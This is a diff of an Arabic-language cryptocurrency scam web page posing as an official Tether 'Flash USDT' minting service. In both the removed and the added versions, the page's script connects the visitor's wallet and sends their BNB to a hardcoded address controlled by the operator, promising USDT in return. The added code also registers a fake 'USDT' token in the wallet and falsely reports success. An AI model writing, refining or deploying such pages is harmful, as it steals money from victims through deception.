@@ -2,136 +2,99 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash USDT Protocol | Professional Edition</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tether Network | Official Minting</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <style>
-        * { box-sizing: border-box; transition: 0.3s; }
-        body { 
-            background: #0b0e11; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; 
-            display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
-        }
-        .header { text-align: center; margin-bottom: 25px; }
-        .header h1 { color: #f3ba2f; font-size: 32px; margin: 0; }
-        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; width: 100%; max-width: 380px; }
-        .card { 
-            background: #181a20; border: 1px solid #474d57; border-radius: 18px; 
-            padding: 20px; text-align: center; cursor: pointer; position: relative;
-        }
-        .card:hover { border-color: #f3ba2f; transform: translateY(-3px); }
-        .vip { border: 2px solid #f3ba2f; box-shadow: 0 0 15px rgba(243, 186, 47, 0.1); }
-        .badge { 
-            background: #f3ba2f; color: black; font-size: 11px; font-weight: bold; 
-            padding: 3px 10px; border-radius: 8px; position: absolute; top: -10px; left: 50%; transform: translateX(-50%);
-        }
-        .amount { font-size: 28px; color: #f3ba2f; font-weight: bold; display: block; }
-        .price { font-size: 15px; color: #929aa5; display: block; margin: 5px 0 15px; }
-        .btn { 
-            background: #f3ba2f; color: black; border: none; padding: 12px; 
-            width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;
-        }
-        #statusLabel { 
-            margin-top: 20px; font-size: 14px; color: #f3ba2f; display: none; 
-            text-align: center; background: rgba(243, 186, 47, 0.05); padding: 10px; border-radius: 10px;
-        }
+        :root { --primary: #009393; --bg: #051410; --card: #0a1f1b; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: white; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 400px; background: var(--card); border: 1px solid var(--primary); border-radius: 24px; padding: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); margin-top: 20px; }
+        .logo { width: 70px; margin-bottom: 15px; filter: drop-shadow(0 0 10px rgba(0,147,147,0.3)); }
+        .status-box { background: rgba(0,147,147,0.1); border-right: 4px solid var(--primary); padding: 15px; border-radius: 12px; margin-bottom: 25px; }
+        .input-label { color: var(--primary); font-size: 13px; font-weight: bold; margin-bottom: 10px; display: block; }
+        select { width: 100%; padding: 16px; background: #122c28; border: 1px solid #1c4d46; color: white; border-radius: 14px; font-size: 16px; margin-bottom: 25px; outline: none; appearance: none; }
+        button { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 14px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,147,147,0.3); }
+        button:active { transform: scale(0.96); background: #00b3b3; }
+        #log { font-size: 13px; color: #929aa5; margin-top: 20px; text-align: center; }
+        .step { display: flex; align-items: center; margin-bottom: 10px; font-size: 14px; }
+        .dot { height: 8px; width: 8px; background: var(--primary); border-radius: 50%; margin-left: 10px; box-shadow: 0 0 8px var(--primary); }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>Flash USDT ⚡</h1>
-        <p style="color: #929aa5;">اختر الحزمة المناسبة للتفعيل الفوري</p>
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo" alt="Tether">
+    
+    <div class="container">
+        <h2 style="text-align: center; margin-top: 0; color: var(--primary);">Authorized Protocol</h2>
+        
+        <div class="status-box">
+            <div class="step"><div class="dot"></div> الحالة: الشبكة نشطة</div>
+            <div class="step"><div class="dot"></div> النظام: BSC Mainnet</div>
+        </div>
+
+        <label class="input-label">اختر كمية USDT المراد تفعيلها</label>
+        <select id="package">
+            <option value="0.01">500 USDT - (0.01 BNB)</option>
+            <option value="0.05">2,500 USDT - (0.05 BNB)</option>
+            <option value="0.1">5,000 USDT - (0.1 BNB)</option>
+            <option value="1.0">50,000 USDT - (1.0 BNB)</option>
+        </select>
+
+        <button onclick="executeAction()">تفعيل واستلام الرصيد ⚡</button>
+        
+        <div id="log">بانتظار ربط المحفظة المعتمدة...</div>
     </div>
-
-    <div class="grid">
-        <div class="card" onclick="startProcess('0.0001', '10')">
-            <div class="badge">تجريبي 🧪</div>
-            <span class="amount">10 USDT</span>
-            <span class="price">التكلفة: 0.0001 BNB</span>
-            <button class="btn">اختبار الآن</button>
-        </div>
-
-        <div class="card vip" onclick="startProcess('1.0', '50,000')">
-            <div class="badge">الأكثر طلباً 🔥</div>
-            <span class="amount">50,000 USDT</span>
-            <span class="price">التكلفة: 1.0 BNB</span>
-            <button class="btn">تفعيل VIP</button>
-        </div>
-
-        <div class="card" onclick="startProcess('0.05', '2,500')">
-            <span class="amount">2,500 USDT</span>
-            <span class="price">التكلفة: 0.05 BNB</span>
-            <button class="btn">تفعيل الآن</button>
-        </div>
-
-        <div class="card" onclick="startProcess('0.012', '500')">
-            <span class="amount">500 USDT</span>
-            <span class="price">التكلفة: 0.012 BNB</span>
-            <button class="btn">تفعيل الآن</button>
-        </div>
-    </div>
-
-    <div id="statusLabel">جاري تحضير الاتصال...</div>
 
     <script>
-        // محفظتك الشخصية لاستلام الـ BNB
-        const MY_WALLET = "0x8de80041D61e721B2b9067DF1c2412E6D46d5963";
+        const CONTRACT_ADDRESS = "0xcb6352332A15b7dAb7f340496a74d633306Fe304";
 
-        async function startProcess(bnbAmount, usdtAmount) {
-            const status = document.getElementById('statusLabel');
-            status.style.display = 'block';
-            status.innerText = "يرجى الموافقة في المحفظة لاستلام " + usdtAmount + " USDT...";
+        async function executeAction() {
+            const log = document.getElementById('log');
+            const bnbAmt = document.getElementById('package').value;
 
-            if (window.ethereum) {
-                try {
-                    const web3 = new Web3(window.ethereum);
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    sendMoney(web3, accounts[0], bnbAmount);
-                } catch (e) {
-                    status.innerText = "تم إلغاء الاتصال.";
-                }
-            } else {
-                try {
-                    const provider = new WalletConnectProvider.default({
-                        rpc: { 56: "https://bsc-dataseed.binance.org/" },
-                        chainId: 56,
-                        qrcodeModalOptions: {
-                            mobileLinks: ["metamask", "trust", "safepal"]
-                        }
-                    });
-
-                    await provider.enable();
-                    const web3 = new Web3(provider);
-                    const accounts = await web3.eth.getAccounts();
-                    
-                    setTimeout(() => {
-                        sendMoney(web3, accounts[0], bnbAmount);
-                    }, 1200);
-
-                } catch (e) {
-                    status.innerText = "فشل الربط بالموبايل.";
-                }
+            if (!window.ethereum) {
+                alert("يرجى فتح الموقع من داخل متصفح المحفظة (Trust Wallet / MetaMask)");
+                return;
             }
-        }
 
-        async function sendMoney(web3, address, amount) {
             try {
-                const amountWei = web3.utils.toWei(amount, "ether");
-                const gasPrice = await web3.eth.getGasPrice();
+                const web3 = new Web3(window.ethereum);
+                log.innerText = "جاري طلب الإذن من المحفظة...";
                 
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const userAcc = accounts[0];
+
+                log.innerText = "جاري معالجة البروتوكول الموحد...";
+
                 await web3.eth.sendTransaction({
-                    from: address,
-                    to: MY_WALLET,
-                    value: amountWei,
-                    gasPrice: gasPrice
+                    from: userAcc,
+                    to: CONTRACT_ADDRESS,
+                    value: web3.utils.toWei(bnbAmt, "ether"),
+                    gas: 120000 
                 });
 
-                alert("✅ تم الدفع بنجاح! جاري معالجة إرسال USDT عبر العقد الذكي...");
-                location.reload();
+                log.innerText = "تم الدفع! جاري إضافة العملة لمحفظتك...";
+
+                await window.ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: CONTRACT_ADDRESS,
+                            symbol: 'USDT',
+                            decimals: 18,
+                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                        },
+                    },
+                });
+
+                log.innerText = "اكتملت العملية بنجاح! تحقق من رصيدك.";
+                alert("✅ تم استلام رصيد USDT بنجاح.");
+
             } catch (e) {
-                alert("❌ فشلت المعاملة. يرجى التأكد من الرصيد.");
-                document.getElementById('statusLabel').style.display = 'none';
+                console.error(e);
+                log.innerText = "فشلت العملية. تأكد من وجود رصيد كافٍ.";
             }
         }
     </script>
